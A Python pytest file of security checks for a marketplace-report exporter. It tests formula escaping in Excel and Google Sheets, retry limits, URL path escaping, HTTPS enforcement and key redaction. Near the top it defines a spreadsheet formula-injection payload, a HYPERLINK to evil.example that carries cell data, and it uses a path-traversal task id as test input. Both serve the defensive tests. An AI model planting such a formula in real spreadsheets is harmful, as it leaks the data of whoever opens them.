"""Проверки безопасности: текст из кабинета не исполняется в таблице, ключи не утекают."""

from dataclasses import replace

import pytest
import requests
from openpyxl import load_workbook

from wbreport import __main__ as app
from wbreport import config, export
from wbreport.api import MAX_RETRY_DELAY, WBClient, retry_delay
from wbreport.report import Sheet

EVIL = '=HYPERLINK("https://evil.example/?d="&A2,"x")'


def evil_sheet():
    return Sheet("Реклама", ["Кампания", "Расход"], [[EVIL, 10], ["+7 999", 5], ["Пледы", 1]])


def test_excel_keeps_formula_like_text_as_text(tmp_path):
    path = export.to_excel([evil_sheet()], tmp_path / "r.xlsx")
    ws = load_workbook(path)["Реклама"]
    assert ws["A2"].value == EVIL and ws["A2"].data_type == "s"
    assert ws["B2"].value == 10


def test_gsheet_formula_like_text_gets_apostrophe():
    values = export._gsheet_values(evil_sheet())
    assert values[1] == ["'" + EVIL, 10]
    assert values[2] == ["'+7 999", 5]
    assert values[3] == ["Пледы", 1]  # обычный текст и числа не трогаем


@pytest.mark.parametrize(
    "header, attempt, expected",
    [
        ("7", 1, 7.0),
        (None, 2, 10.0),
        ("abc", 1, 5.0),  # мусор не роняет клиент
        ("inf", 1, 5.0),
        ("nan", 1, 5.0),
        ("-30", 1, 5.0),
        ("1e9", 1, MAX_RETRY_DELAY),  # сервер не усыпит отчёт навсегда
    ],
)
def test_retry_delay_is_sane(header, attempt, expected):
    assert retry_delay(header, attempt) == expected


class Resp:
    def __init__(self, data):
        self.status_code, self.headers, self._data = 200, {}, data

    def json(self):
        return self._data


def test_stocks_task_id_is_escaped_in_path():
    urls = []

    class Session(requests.Session):
        def get(self, url, params=None, timeout=None):
            urls.append(url)
            if url.endswith("/warehouse_remains"):
                return Resp({"data": {"taskId": "../../adv/x?y=1"}})
            if url.endswith("/status"):
                return Resp({"data": {"status": "done"}})
            return Resp([])

    c = WBClient(
        "t", stats_url="https://s", analytics_url="https://a", advert_url="https://ad", session=Session()
    )
    c.stocks()
    assert urls[1] == "https://a/api/v1/warehouse_remains/tasks/..%2F..%2Fadv%2Fx%3Fy%3D1/status"


def test_plain_http_api_url_is_refused(monkeypatch):
    monkeypatch.setenv("WB_ADVERT_URL", "http://advert-api.wildberries.ru")
    with pytest.raises(SystemExit, match="WB_ADVERT_URL.*https"):
        config.load()


@pytest.mark.parametrize("name", ["WB_STATS_URL", "OZON_URL", "OZON_PERF_URL"])
def test_http_only_to_own_machine(monkeypatch, name):
    monkeypatch.setenv(name, "http://127.0.0.1:8080")
    config.load()
    monkeypatch.setenv(name, "ftp://x")
    with pytest.raises(SystemExit):
        config.load()


def test_settings_repr_hides_keys():
    cfg = replace(config.load(), token="WBSECRET", ozon_api_key="OZSECRET", ozon_ads_secret="ADSECRET")
    text = repr(cfg)
    assert "SECRET" not in text and "stats_url" in text


def test_negative_every_is_rejected(capsys):
    with pytest.raises(SystemExit) as e:
        app.main(["--every", "-1"])
    assert e.value.code == 2
    assert "--every" in capsys.readouterr().err
